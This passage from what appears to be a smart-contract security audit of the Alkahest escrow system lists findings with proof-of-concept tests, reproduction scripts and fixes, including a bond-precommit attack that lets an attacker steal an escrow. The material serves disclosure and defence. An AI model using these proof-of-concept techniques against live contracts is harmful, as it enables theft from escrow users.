 * `0x0000000000000000000000000000000000000000` as a known `referencesEscrowArbiter` decoder target and reverse-index
 * entry instead of surfacing it as unsupported. Second, a default ERC20 escrow created with `arbiter = address(0)`
 * accepts deposits, rejects every `collect`, and becomes reclaimable after expiry, so an integrator who trusts the
 * supported-chain decoder/index surfaces can approve an escrow that only the creator can safely unwind.
 */

describe("POC zero-address references arbiter visibility", () => {
  test("supported-chain helpers treat address(0) as known while zero-arbiter default escrows remain reclaim-only", async () => {
    const zero = "0x0000000000000000000000000000000000000000" as const;
    const ethereumAddresses = contractAddresses["Ethereum"];

    const decoded = decodeDemandWithAddresses({ arbiter: zero, demand: "0x" }, ethereumAddresses);
    expect(decoded.arbiter).toBe(zero);
    expect(decoded.isUnknown).toBeUndefined();
    expect(decoded.decoded).toEqual({});

    const matches = lookupAddress(ethereumAddresses, zero);
    expect(matches.some((match) => match.contract === "referencesEscrowArbiter")).toBe(true);
    expect(matches.some((match) => match.contract === "erc20UnconditionalEscrowObligation")).toBe(true);

    const erc20Abi = parseAbi(["function balanceOf(address) view returns (uint256)"]);
    const context = await setupTestEnvironment();

    try {
      const price = { address: context.mockAddresses.erc20A, value: 10n };
      const before = await context.alice.client.viemClient.readContract({
        address: price.address,
        abi: erc20Abi,
        functionName: "balanceOf",
        args: [context.alice.address],
      });

      const block = await context.alice.client.viemClient.getBlock();
      const expiration = block.timestamp + 5n;

      const { attested: escrow } = await context.alice.client.erc20.escrow.default.approveAndCreate(
        price,
        { arbiter: zero, demand: "0x" },
        expiration,
      );

      const afterCreate = await context.alice.client.viemClient.readContract({
        address: price.address,
        abi: erc20Abi,
        functionName: "balanceOf",
        args: [context.alice.address],
      });
      expect(afterCreate).toBe(before - price.value);

      const { attested: fulfillment } = await context.bob.client.stringObligation.doObligation(
        "service delivered",
        undefined,
        escrow.uid,
      );

      await expect(context.bob.client.erc20.escrow.default.collect(escrow.uid, fulfillment.uid)).rejects.toThrow();

      await context.testClient.increaseTime({ seconds: 10 });
      await context.testClient.mine({ blocks: 1 });

      const reclaimHash = await context.alice.client.erc20.escrow.default.reclaim(escrow.uid);
      await context.testClient.waitForTransactionReceipt({ hash: reclaimHash });

      const afterReclaim = await context.alice.client.viemClient.readContract({
        address: price.address,
        abi: erc20Abi,
        functionName: "balanceOf",
        args: [context.alice.address],
      });
      expect(afterReclaim).toBe(before);
    } finally {
      await teardownTestEnvironment(context);
    }
  }, 60_000);
});
```

#### Recommendation

The SDK should never register or label zero-address placeholders as real deployed contracts.

Primary fix:

```ts
const isLiveAddress = (address?: `0x${string}`) =>
  !!address && address.toLowerCase() !== "0x0000000000000000000000000000000000000000";

if (isLiveAddress(addresses.referencesEscrowArbiter)) {
  decoders[addresses.referencesEscrowArbiter.toLowerCase() as Address] = decodeReferencesEscrowDemand as DemandDecoder;
}
```

Apply the same non-zero filtering to TS `createAddressIndex`, Rust `default_demand_codecs` / `address_index`, and Python `address_infos_inner`. For supported chains with unreleased placeholders, expose those modules as unsupported instead of silently aliasing them to zero.

Fix checklist:

- [ ] Register demand decoders only when the configured address is non-zero.
- [ ] Skip zero addresses when building TypeScript reverse-address indexes.
- [ ] Filter `Address::ZERO` out of Rust demand codec registration and reverse-address indexing.
- [ ] Skip zero addresses when building Python address info and address indexes.
- [ ] Represent unreleased supported-chain modules as unsupported or unset instead of `address(0)`.
- [ ] Add regression coverage for the shipped `Ethereum` and `GenLayer Bradbury` zero-placeholder configs.

#### Assumptions

- [x] The counterparty uses shipped SDK inspection helpers (`decodeDemandWithAddresses`, `lookupAddress`, Rust/Python address lookup) as their best-effort validation path.
- [x] The attacker uses an expiring default escrow, so reclaim remains available after the victim has delivered the off-chain side.
- [x] The victim relies on the SDK's supported-chain address maps instead of maintaining an independent allowlist for every arbiter address.

#### Predicted Invalid Reasons

- `address(0)` is obviously unsafe, the protocol intentionally allows arbitrary arbiters, and the main decode path still shows the zero address, so counterparties should reject it themselves.

<a id="finding-alka-24"></a>
### ALKA-24 — Hook-based validation certificates can be labeled revocable even though no one can ever revoke them

#### Summary

The hook copies caller-controlled `validationRevocable` into a validation attestation, but the hook contract is the attester and has no reachable path to `eas.revoke()` for that certificate. That makes `revocable = true` only a header bit, not a real lifecycle guarantee, and can mislead consumers such as `RevocableArbiter`.

#### Context Files

##### HookData

Path: `alkahest/contracts/src/obligations/escrow/hook-based/hooks/AttestationReferenceEscrowHook.sol`
Highlight lines: 5

```solidity
struct HookData {
    bytes32 attestationUid;
    address recipient;
    uint64 validationExpirationTime;
    bool validationRevocable;
}
```

##### onRelease() validation mint

Path: `alkahest/contracts/src/obligations/escrow/hook-based/hooks/AttestationReferenceEscrowHook.sol`
Highlight lines: 10

```solidity
HookData memory decoded = abi.decode(data, (HookData));
bytes memory validationData = abi.encode(decoded.attestationUid);

eas.attest(
    AttestationRequest({
        schema: VALIDATION_SCHEMA,
        data: AttestationRequestData({
            recipient: decoded.recipient,
            expirationTime: decoded.validationExpirationTime,
            revocable: decoded.validationRevocable,
            refUID: decoded.attestationUid,
            data: validationData,
            value: 0
        })
    })
);
```

##### EAS revoke access control

Path: `alkahest/contracts/lib/eas-contracts/contracts/EAS.sol`
Highlight lines: 2

```solidity
// Allow only original attesters to revoke their attestations.
if (attestation.attester != revoker) {
    revert AccessDenied();
}
```

##### RevocableArbiter check

Path: `alkahest/contracts/src/arbiters/attestation-properties/RevocableArbiter.sol`
Highlight lines: 1

```solidity
if (fulfillment.revocable != demand_.revocable) {
    revert RevocabilityMismatched();
}
```

#### Proof of Concept

A Foundry test mints a hook validation attestation with `revocable = true`, confirms an external caller gets `AccessDenied` when revoking it through EAS, and shows a downstream default escrow still rejects the certificate because `refUID` is bound to the original attestation.

##### Reproduce issue

Path: ``

```bash
cd /home/user/workspace/alkahest/contracts
timeout 300 forge test --match-path test/unit/obligations/escrow/hook-based/POC_AttestationReferenceEscrowHookRevocable_e584c275.t.sol -vv
```

##### POC test

Path: `alkahest/contracts/test/unit/obligations/escrow/hook-based/POC_AttestationReferenceEscrowHookRevocable_e584c275.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import {
    AttestationReferenceEscrowHook
} from "@src/obligations/escrow/hook-based/hooks/AttestationReferenceEscrowHook.sol";
import {
    AttestationReferenceEscrowObligation
} from "@src/obligations/escrow/default/AttestationReferenceEscrowObligation.sol";
import {BaseEscrowObligation} from "@src/BaseEscrowObligation.sol";
import {RevocableArbiter} from "@src/arbiters/attestation-properties/RevocableArbiter.sol";
import {
    IEAS,
    AttestationRequest,
    AttestationRequestData,
    RevocationRequest,
    RevocationRequestData
} from "@eas/IEAS.sol";
import {Attestation, AccessDenied} from "@eas/Common.sol";
import {ISchemaRegistry} from "@eas/ISchemaRegistry.sol";
import {ISchemaResolver} from "@eas/resolver/ISchemaResolver.sol";
import {EASDeployer} from "@test/utils/EASDeployer.sol";

/**
 * @title POC: Hook-minted `revocable=true` validation certificates are not externally revocable
 * @notice Proof Statement: This test proves two facts at once. First, `AttestationReferenceEscrowHook`
 * mints validation attestations with `revocable=true` that ordinary callers cannot revoke because EAS
 * only authorizes the original attester and the hook exposes no revoke entrypoint. Second, the claimed
 * repo-native settlement impact is overstated: the same certificate cannot satisfy a downstream default
 * escrow because default escrows reject fulfillments whose `refUID` does not equal the escrow UID.
 */
contract POC_AttestationReferenceEscrowHookRevocable_e584c275 is Test {
    IEAS internal eas;
    ISchemaRegistry internal schemaRegistry;
    AttestationReferenceEscrowHook internal hook;
    AttestationReferenceEscrowObligation internal downstreamEscrow;
    RevocableArbiter internal revocableArbiter;

    address internal caller = makeAddr("caller");
    address internal recipient = makeAddr("recipient");
    address internal attester = makeAddr("attester");

    bytes32 internal originSchema;
    bytes32 internal originalAttestationUid;

    function setUp() public {
        EASDeployer easDeployer = new EASDeployer();
        (eas, schemaRegistry) = easDeployer.deployEAS();

        hook = new AttestationReferenceEscrowHook(eas, schemaRegistry);
        downstreamEscrow = new AttestationReferenceEscrowObligation(eas, schemaRegistry);
        revocableArbiter = new RevocableArbiter();

        vm.prank(caller);
        hook.approveEscrow(caller);

        originSchema = schemaRegistry.register("string testData", ISchemaResolver(address(0)), true);

        vm.prank(attester);
        originalAttestationUid = eas.attest(
            AttestationRequest({
                schema: originSchema,
                data: AttestationRequestData({
                    recipient: recipient,
                    expirationTime: 0,
                    revocable: true,
                    refUID: bytes32(0),
                    data: abi.encode("origin"),
                    value: 0
                })
            })
        );
    }

    function testHookMintedRevocableValidationIsIrrevocableInPracticeButNotADefaultEscrowBypass() public {
        bytes memory hookData = abi.encode(
            AttestationReferenceEscrowHook.HookData({
                attestationUid: originalAttestationUid,
                recipient: recipient,
                validationExpirationTime: 0,
                validationRevocable: true
            })
        );

        vm.startPrank(caller);
        hook.onLock(hookData, caller, caller);
        vm.recordLogs();
        hook.onRelease(hookData, recipient, _dummyEscrow(), bytes32(0));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        vm.stopPrank();

        bytes32 validationUid = _findValidationUid(logs);
        assertNotEq(validationUid, bytes32(0), "hook should mint validation attestation");

        Attestation memory validation = eas.getAttestation(validationUid);
        assertEq(validation.attester, address(hook), "hook should be the attester");
        assertTrue(validation.revocable, "hook should mirror requested revocable bit");
        assertEq(validation.refUID, originalAttestationUid, "validation should point to original attestation");

        bytes32 validationSchema = hook.VALIDATION_SCHEMA();

        vm.prank(caller);
        vm.expectRevert(AccessDenied.selector);
        eas.revoke(
            RevocationRequest({
                schema: validationSchema,
                data: RevocationRequestData({uid: validationUid, value: 0})
            })
        );

        bytes memory demand = abi.encode(RevocableArbiter.DemandData({revocable: true}));
        assertTrue(
            revocableArbiter.check(validation, demand, bytes32(0)),
            "revocable arbiter accepts the certificate based on the header bit alone"
        );

        AttestationReferenceEscrowObligation.ObligationData memory downstreamData =
            AttestationReferenceEscrowObligation.ObligationData({
                arbiter: address(revocableArbiter),
                demand: demand,
                attestationUid: originalAttestationUid,
                validationExpirationTime: 0,
                validationRevocable: false
            });

        vm.prank(caller);
        bytes32 downstreamEscrowUid = downstreamEscrow.doObligation(downstreamData, uint64(block.timestamp + 1 days));

        vm.prank(caller);
        vm.expectRevert(BaseEscrowObligation.InvalidFulfillment.selector);
        downstreamEscrow.collect(downstreamEscrowUid, validationUid);
    }

    function _dummyEscrow() internal view returns (Attestation memory) {
        return Attestation({
            uid: keccak256("escrow"),
            schema: bytes32(0),
            time: 0,
            expirationTime: 0,
            revocationTime: 0,
            refUID: bytes32(0),
            recipient: address(0),
            attester: caller,
            revocable: true,
            data: ""
        });
    }

    function _findValidationUid(Vm.Log[] memory logs) internal view returns (bytes32 uid) {
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].topics.length == 4
                    && logs[i].topics[0] == keccak256("Attested(address,address,bytes32,bytes32)")
                    && logs[i].topics[3] == hook.VALIDATION_SCHEMA()
            ) {
                return abi.decode(logs[i].data, (bytes32));
            }
        }
    }
}

```

#### Recommendation

Primary fix:
- Either add a controlled revocation path for hook-minted validation certificates, or force `validationRevocable = false` so the emitted certificate does not advertise a capability the contract cannot honor.

Example fix direction:

```solidity
function revokeValidation(bytes32 uid) external {
    // enforce whatever lifecycle / authority policy is intended
    eas.revoke(RevocationRequest({
        schema: VALIDATION_SCHEMA,
        data: RevocationRequestData({uid: uid, value: 0})
    }));
}
```

Alternative fix:
- remove `validationRevocable` from the hook data and hardcode `revocable: false` until a real revocation lifecycle exists.
- update SDK defaults so clients do not default to `validationRevocable = true`.

#### Assumptions

- [x] A downstream flow treats `revocable = true` as a meaningful safety property.
- [x] The attacker can mint or obtain a hook-produced validation certificate through the intended escrow flow.
- [x] The certificate remains relevant long enough that the missing revoke path matters.

#### Predicted Invalid Reasons

- `revocable` is only EAS metadata; if an integrator cares about practical revocation, they should inspect the attester contract rather than trust the bit alone.

<a id="finding-alka-6"></a>
### ALKA-6 — TypeScript demand helpers strip the trusted oracle address from escrow inspection

#### Summary

Root TS escrow helpers `extractDemandData` and `getEscrowAndDemand` unwrap a `TrustedOracleArbiter` demand and return only the inner `data`, dropping the outer `oracle` field that controls settlement authority. A runtime reproduction shows the generic helper cannot recover `(address oracle, bytes data)`, while the dedicated `decodeDemand` path can.

#### Context Files

##### index.ts

Path: `alkahest/sdks/ts/src/index.ts`
Highlight lines: 5, 9, 11

```ts
extractDemandData: <DemandData extends readonly AbiParameter[]>(
  demandAbi: DemandData,
  escrowAttestation: { data: `0x${string}` },
): DecodeAbiParametersReturnType<DemandData> => {
  const arbiterDemandAbi = parseAbiParameters("(address arbiter, bytes demand)");
  const arbiterDemand = decodeAbiParameters(arbiterDemandAbi, escrowAttestation.data)[0];

  const trustedOracleDemandAbi = parseAbiParameters("(address oracle, bytes data)");
  const trustedOracleDemand = decodeAbiParameters(trustedOracleDemandAbi, arbiterDemand.demand)[0];

  return decodeAbiParameters(demandAbi, trustedOracleDemand.data);
},
```

##### TrustedOracleArbiter.sol

Path: `alkahest/contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 2, 3

```sol
struct DemandData {
    address oracle;
    bytes data;
}
```

##### TrustedOracleArbiter.sol

Path: `alkahest/contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 7, 8, 9

```sol
function check(Attestation memory fulfillment, bytes memory demand, bytes32)
    public
    view
    override
    returns (bool)
{
    DemandData memory demand_ = abi.decode(demand, (DemandData));
    bytes32 decisionKey = keccak256(abi.encodePacked(fulfillment.uid, demand_.data));
    return decisions[demand_.oracle][decisionKey];
}
```

#### Proof of Concept

Run the shipped TS bundle against a synthetic trusted-oracle escrow. The root helper returns only the inner payload, cannot recover the outer `(address oracle, bytes data)` wrapper, and the dedicated `decodeDemand` path exposes the oracle from the same bytes.

##### repro

Path: ``

```bash
node --input-type=module <<'NODE'
import { createWalletClient, encodeAbiParameters, http, parseAbiParameters } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { foundry } from "viem/chains";
import { makeClient } from "./dist/index.js";

const wallet = createWalletClient({
  account: privateKeyToAccount("0x59c6995e998f97a5a0044966f0945384e15b63d1f9ff15f0e6f52f7c57d4d6b4"),
  chain: foundry,
  transport: http("http://127.0.0.1:8545"),
});

const trustedOracleArbiter = "0x504f496F696c41558070a933c90a98604c3f4475";
const client = makeClient(wallet, { trustedOracleArbiter });

const innerAbi = parseAbiParameters("(string query)");
const outerAbi = parseAbiParameters("(address oracle, bytes data)");
const arbiterDemandAbi = parseAbiParameters("(address arbiter, bytes demand)");

const oracle = "0x2222222222222222222222222222222222222222";
const innerData = encodeAbiParameters(innerAbi, [{ query: "capitalize hello world" }]);
const demand = client.arbiters.general.trustedOracle.encodeDemand({ oracle, data: innerData });
const escrowData = encodeAbiParameters(arbiterDemandAbi, [{ arbiter: trustedOracleArbiter, demand }]);

console.log("extractDemandData inner ABI =>", JSON.stringify(client.extractDemandData(innerAbi, { data: escrowData })));
try {
  console.log(
    "extractDemandData trusted-oracle ABI =>",
    JSON.stringify(client.extractDemandData(outerAbi, { data: escrowData })),
  );
} catch (error) {
  console.log("extractDemandData trusted-oracle ABI error =>", error instanceof Error ? error.message : String(error));
}
console.log(
  "decodeDemand trusted-oracle =>",
  JSON.stringify(client.decodeDemand({ arbiter: trustedOracleArbiter, demand })),
);
NODE
```

#### Recommendation

Make these helpers explicit about their scope and return the full trusted-oracle wrapper instead of silently stripping it.

Primary fix:

```ts
extractTrustedOracleDemand: (escrowAttestation) => {
  const arbiterDemand = decodeAbiParameters(parseAbiParameters("(address arbiter, bytes demand)"), escrowAttestation.data)[0];
  return decodeAbiParameters(parseAbiParameters("(address oracle, bytes data)"), arbiterDemand.demand)[0];
}
```

Then let callers separately decode the inner `data` field after they have inspected `oracle`. Alternatively, gate the current helper behind an explicit name such as `extractTrustedOracleInnerData` and return both `{ oracle, data, decodedInner }`.

#### Assumptions

- [x] The integration uses the shipped TS helpers `extractDemandData` or `getEscrowAndDemand` instead of manually decoding `TrustedOracleArbiter.DemandData`.
- [x] The escrow uses `TrustedOracleArbiter`, so `oracle` is the settlement authority field.
- [x] The victim relies on helper output as their best-effort inspection of who controls settlement.

#### Predicted Invalid Reasons

- These helpers are just conveniences for inner application data; callers can decode the outer trusted-oracle wrapper themselves.

<a id="finding-alka-11"></a>
### ALKA-11 — AttestationEscrowObligation can only deliver irrevocable attestations even when the request says revocable

#### Summary

`AttestationEscrowObligation` stores a full future `AttestationRequest` and later mints that request itself. That means the released attestation can be created with `revocable = true`, but the escrow contract becomes the attester of record and exposes no path to call `eas.revoke(...)` for the released UID. Downstream composition with `RevocableArbiter` can therefore accept a revocability promise the contract cannot actually honor.

#### Context Files

##### ObligationData

Path: `alkahest/contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`
Highlight lines: 1

```solidity
struct ObligationData {
    address arbiter;
    bytes demand;
    AttestationRequest attestation;
}
```

##### _releaseEscrow

Path: `alkahest/contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`
Highlight lines: 1

```solidity
function _releaseEscrow(Attestation memory escrow, address, bytes32) internal override returns (bytes memory) {
    ObligationData memory decoded = abi.decode(escrow.data, (ObligationData));
    bytes32 attestationUid;
    try eas.attest{value: decoded.attestation.data.value}(decoded.attestation) returns (bytes32 uid) {
        attestationUid = uid;
    } catch {
        revert AttestationCreationFailed();
    }
    return abi.encode(attestationUid);
}
```

##### check

Path: `alkahest/contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`
Highlight lines: 1

```solidity
return keccak256(abi.encode(escrow.attestation)) == keccak256(abi.encode(demandData.attestation))
    && escrow.arbiter == demandData.arbiter && keccak256(escrow.demand) == keccak256(demandData.demand);
```

#### Proof of Concept

1. Alice accepts an `AttestationEscrowObligation` as proof that Bob will deliver a revocable attestation.
2. Bob creates an escrow whose embedded `AttestationRequestData.revocable` flag is `true`, or composes the released attestation with `RevocableArbiter({ revocable: true })`.
3. Alice releases value because the escrow `check` path and resulting attestation metadata both say the credential is revocable.
4. The released attestation cannot later be revoked, because the escrow contract is the attester of record and there is no path to call `eas.revoke(...)` for that UID.

##### ObligationData

Path: `alkahest/contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`

```solidity
struct ObligationData {
    address arbiter;
    bytes demand;
    AttestationRequest attestation;
}
```

##### _releaseEscrow

Path: `alkahest/contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`

```solidity
function _releaseEscrow(Attestation memory escrow, address, bytes32) internal override returns (bytes memory) {
    ObligationData memory decoded = abi.decode(escrow.data, (ObligationData));
    bytes32 attestationUid;
    try eas.attest{value: decoded.attestation.data.value}(decoded.attestation) returns (bytes32 uid) {
        attestationUid = uid;
    } catch {
        revert AttestationCreationFailed();
    }
    return abi.encode(attestationUid);
}
```

##### check

Path: `alkahest/contracts/src/obligations/escrow/default/AttestationEscrowObligation.sol`

```solidity
return keccak256(abi.encode(escrow.attestation)) == keccak256(abi.encode(demandData.attestation))
    && escrow.arbiter == demandData.arbiter && keccak256(escrow.demand) == keccak256(demandData.demand);
```

#### Recommendation

If the released attestation cannot actually be revoked, do not advertise it as revocable.

Primary fix:

```solidity
decoded.attestation.data.revocable = false;
```

More generally, sanitize or reject any `AttestationRequest` whose `revocable` flag is `true` unless the contract also exposes a real revoke path for released attestation UIDs.

If revocable released attestations are required, add a dedicated revoke function that accepts the released UID, enforces the intended authorization policy, and calls `eas.revoke(...)` from the escrow contract.

Fix checklist:

- [ ] Force `decoded.attestation.data.revocable = false` before calling `eas.attest(...)`.

#### Assumptions

- [x] The released attestation is minted by the escrow contract via `eas.attest(...)`.
- [x] `EAS` only permits the attester of record to revoke a revocable attestation.
- [x] `AttestationEscrowObligation` does not expose a public or external revoke-by-UID entrypoint for released attestations.

#### Predicted Invalid Reasons

- "This is just the intended responsibility split."
- "The escrow arbiter only proves an escrow with those parameters exists."

<a id="finding-alka-26"></a>
### ALKA-26 — Base Sepolia address docs still route token-bundle escrows to a pre-fix partial-collection deployment

#### Summary

Base Sepolia docs and deployment metadata still publish stale `TokenBundleEscrowObligation` / `CommitRevealObligation` addresses from a pre-fix deployment, while the current SDK/CLI defaults already use the June 24, 2026 redeploy. This is real documentation and deployment-metadata drift on a testnet surface, not a current default-path exploit.

#### Context Files

##### stale Base Sepolia addresses

Path: `docs/skills/alkahest-user/references/contracts.md`
Highlight lines: 82, 90

```markdown
| TokenBundleEscrowObligation | `0x38e8E5684aFB24A88cD9B276032bCBD19C4b9d6e` |
| CommitRevealObligation | `0x447b11ce03237f0C674eF7F16c913c3B2e8ef494` |
```

##### current Base Sepolia SDK preset

Path: `sdks/ts/src/config.ts`
Highlight lines: 71, 82

```typescript
tokenBundleEscrowObligation: "0xC52c611c0C9A11fF625B93f9D1fb9E74C45d9859",
commitRevealObligation: "0x14d0B7D4ed6915CE0b1a0d54F9D5912584dB550E",
```

##### authorization fix chronology

Path: `docs/drafts/audit-triage.md`
Highlight lines: 100, 116

```text
### audit_agent_report_7: Token Bundle Unsafe Partial Collection Authorization
Status: fixed for authorization
... third parties ... can no longer trigger the destructive partial collection escape hatch
```

#### Proof of Concept

1. Resolve Base Sepolia addresses from the repo’s published contract table or `contracts/deployments/deployment_base_sepolia.json`.
2. Create bundle escrows against `0x38e8E5684aFB24A88cD9B276032bCBD19C4b9d6e`.
3. Interact with the old immutable bundle escrow deployment instead of the June 24, 2026 redeploy.

##### stale Base Sepolia address table

Path: `docs/skills/alkahest-user/references/contracts.md`

```markdown
| TokenBundleEscrowObligation | `0x38e8E5684aFB24A88cD9B276032bCBD19C4b9d6e` |
| CommitRevealObligation | `0x447b11ce03237f0C674eF7F16c913c3B2e8ef494` |
```

##### current Base Sepolia SDK preset

Path: `sdks/ts/src/config.ts`

```typescript
tokenBundleEscrowObligation: "0xC52c611c0C9A11fF625B93f9D1fb9E74C45d9859",
commitRevealObligation: "0x14d0B7D4ed6915CE0b1a0d54F9D5912584dB550E",
```

##### bytecode-prefix-check

Path: `finding.description`

```text
old tokenBundle code prefix: 0x6080806040526004
new tokenBundle code prefix: 0x6080806040526004
```

#### Recommendation

Make a single source of truth for deployed addresses and generate every public address surface from it.

```text
- Replace the stale Base Sepolia entries in docs/skills and deployment manifests.
- Version or explicitly deprecate superseded deployments instead of presenting them as current.
- Add CI that diffs published docs/manifests against the SDK presets before release.
- Refuse to list stale deployments without a clear "superseded / vulnerable / do not use" marker.
```

Fix checklist:

- [ ] Regenerate `contracts/deployments/deployment_base_sepolia.json` from the canonical SDK Base Sepolia address map.
- [ ] Regenerate `docs/skills/*/references/contracts.md` from the same canonical address map.
- [ ] Make the MCP deployment exporter consume the canonical Base Sepolia address map instead of the static deployment JSON.
- [ ] Add CI that fails when published Base Sepolia docs or manifests diverge from the SDK preset.

#### Assumptions

- [x] Victims use the repo’s published Base Sepolia address references rather than manually reconciling them against the newer SDK preset.
- [x] The old bundle escrow deployment remains callable on Base Sepolia; this was confirmed by fetching bytecode from the published address.
- [x] The later fix required a redeploy for Base Sepolia, which is evidenced by the changed SDK address on June 24, 2026.
- [x] No proxy or upgrade layer sits in front of the old published address; the repo exposes raw contract addresses and deployment JSONs, not upgradeable proxy metadata.

#### Predicted Invalid Reasons

- “These are stale Base Sepolia documentation artifacts, not the addresses used by the SDK, CLI, or current default execution flow.”

<a id="finding-alka-29"></a>
### ALKA-29 — CommitRevealObligation’s bond model is exhaustively bypassable for low-entropy fulfillments, so attackers can precommit every answer and steal the escrow

#### Summary

`CommitRevealObligation` does not stop an attacker from committing every candidate answer for a low-entropy escrow under their own address and later revealing the winning one. The winning bond is refunded on reveal, so only losing guesses remain slashable; in the documented `AllArbiter(CommitRevealObligation, TrustedOracleArbiter)` flow, that can redirect settlement to the attacker once the correct answer becomes public.

#### Context Files

##### CommitRevealObligation.commit()

Path: `contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 1

```solidity
function commit(bytes32 commitment, uint256 commitDeadline) external payable {
    if (commitment == bytes32(0)) revert EmptyCommitment();
    if (msg.value == 0) revert ZeroBondAmount();

    if (commitments[commitment].committer != address(0)) {
        revert CommitmentAlreadyExists(commitment);
    }

    commitments[commitment] = CommitInfo({
        commitBlock: uint64(block.number),
        commitTimestamp: uint64(block.timestamp),
        committer: msg.sender,
        bondAmount: msg.value,
        commitDeadline: commitDeadline
    });
}
```

##### CommitRevealObligation._afterAttest() refund path

Path: `contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 1

```solidity
uint256 amount = info.bondAmount;
commitmentClaimed[revealedCommitment] = true;

(bool success,) = info.committer.call{value: amount}("");
if (!success) revert BondTransferFailed(info.committer, amount);
```

##### CommitRevealObligation.check()

Path: `contracts/src/obligations/CommitRevealObligation.sol`
Highlight lines: 1

```solidity
bytes32 revealedCommitment =
    keccak256(abi.encode(obligation.refUID, obligation.recipient, keccak256(obligation.data)));
CommitInfo memory info = commitments[revealedCommitment];
...
DemandData memory demandData = abi.decode(demand, (DemandData));
if (info.commitDeadline != demandData.commitDeadline) return false;
return info.bondAmount == demandData.bondAmount;
```

#### Proof of Concept

- `Eve` precommitted both `YES` and `NO` against Alice’s `100 ETH` escrow with `0.01 ETH` bonds.
- After Bob revealed `YES`, the oracle approved Eve’s precommitted `YES` too.
- Eve collected the escrow and only the losing bond remained locked.

#### Recommendation

The protocol needs an anti-front-run mechanism whose security does not degrade to `(answer-space size - 1) * bond`.

Safer options include:

```solidity
// Example direction only:
// bind fulfillment to a solver-identity oracle or per-escrow authorization,
// rather than relying on open participation plus cheap symmetric bonds.
```

More concretely:
- Do not market `CommitRevealObligation` as sufficient protection for low-entropy outputs.
- Enforce a stronger per-escrow admission rule when identity matters, such as a designated fulfiller, allowlist, signed ticket, or oracle-authenticated solver identity.
- If open participation must remain, require bond sizing relative to the maximum plausible answer-domain cardinality and escrow value, and expose that requirement explicitly in onchain demand validation or SDK helpers.
- Document that salts do **not** stop exhaustive precommit attacks, because the attacker can choose their own salts for every candidate answer.

#### Assumptions

- [x] The fulfillment domain is realistically enumerable (for example boolean, multiple choice, bounded integer, small winner set, or another low-entropy output space).
- [x] The escrow’s non-commit-reveal validation branch checks answer correctness, not solver identity. This matches the documented `TrustedOracleArbiter` composition pattern.
- [x] The demanded bond is not deliberately set above the attacker’s exhaustive-search cost. The protocol does not enforce such a relationship.
- [x] This report is about production contract behavior, not UI defaults or example-only code.

#### Predicted Invalid Reasons

- This is just a limitation of commit-reveal. Users should set a higher bond or choose a different arbiter.

<a id="finding-alka-1"></a>
### ALKA-1 — Trusted-oracle `allUnarbitrated` mode suppresses demand-specific decisions after any earlier decision on the same fulfillment

#### Summary

The TypeScript trusted-oracle helper's `allUnarbitrated` / `pastUnarbitrated` replay path deduplicates by `(fulfillmentUid, oracle)` instead of the contract's demand-specific `decisionKey`, so a prior decision for one demand can suppress a later legitimate request for the same fulfillment during backlog or restart processing and leave `collect()` blocked until the missing decision is posted. The live `watchEvent` path does not apply this skip.

#### Context Files

##### ArbitrationMade decision key

Path: `alkahest/contracts/src/arbiters/TrustedOracleArbiter.sol`
Highlight lines: 1, 2

```solidity
event ArbitrationMade(bytes32 indexed decisionKey, bytes32 indexed fulfillmentUid, address indexed oracle, bool decision);
bytes32 decisionKey = keccak256(abi.encodePacked(fulfillment.uid, demand_.data));
```

##### Unarbitrated log filter

Path: `alkahest/sdks/ts/src/clients/arbiters/general/trustedOracle.ts`
Highlight lines: 1, 12

```typescript
const existingLogs = await viemClient.getLogs({
  address: addresses.trustedOracleArbiter,
  event: arbitrationMadeEvent,
  args: {
    fulfillmentUid: awd.attestation.uid,
    oracle: viemClient.account.address,
  },
  fromBlock: "earliest",
  toBlock: "latest",
});

return existingLogs.length === 0 ? awd : null;
```

##### Default unarbitrated mode

Path: `alkahest/sdks/ts/src/clients/arbiters/general/trustedOracle.ts`
Highlight lines: 1

```typescript
const mode = options.mode ?? "allUnarbitrated";
```

#### Proof of Concept

- Add the Bun test from the validation analysis in `sdks/ts`.
- The live `allUnarbitrated` listener case still processes a later second demand on the same fulfillment.
- The backlog replay case with `mode: "allUnarbitrated"` skips the real demand after an earlier decision and leaves `collect()` blocked until manual arbitration.

##### bun install

Path: `sdks/ts`

```bash
cd sdks/ts
bun install
```

##### POC_oracle_3f76b899.test.ts

Path: `sdks/ts/tests/unit/POC_oracle_3f76b899.test.ts`

```typescript
import { expect, test } from "bun:test";
import { encodeAbiParameters, parseAbiParameters } from "viem";
import { setupTestEnvironment } from "../utils/setup";
import { teardownTestEnvironment } from "../utils/teardownTestEnvironment";

/**
 * @title POC: TrustedOracleArbiter TS helper demand dedup mismatch
 * @notice Proof Statement: Prove that `mode: "allUnarbitrated"` does not skip a later
 * request while the listener is already running, but it does skip a historical second
 * request for the same `(fulfillmentUid, oracle)` after any earlier `ArbitrationMade`,
 * even when the escrow's real demand is different and still unresolved on-chain.
 */

const demandAbi = parseAbiParameters("(string mockDemand)");

async function makeScenario() {
  const ctx = await setupTestEnvironment();
  const arbiter = ctx.addresses.trustedOracleArbiter;
  const oracle = ctx.charlie.address;

  const realInner = encodeAbiParameters(demandAbi, [{ mockDemand: "real" }]);
  const bogusInner = encodeAbiParameters(demandAbi, [{ mockDemand: "bogus" }]);

  const realDemand = ctx.alice.client.arbiters.general.trustedOracle.encodeDemand({
    oracle,
    data: realInner,
  });
  const bogusDemand = ctx.alice.client.arbiters.general.trustedOracle.encodeDemand({
    oracle,
    data: bogusInner,
  });

  const { attested: escrow } = await ctx.alice.client.erc20.escrow.default.permitAndCreate(
    {
      address: ctx.mockAddresses.erc20A,
      value: 10n,
    },
    { arbiter, demand: realDemand },
    0n,
  );

  const { attested: fulfillment } = await ctx.bob.client.stringObligation.doObligation("work", undefined, escrow.uid);

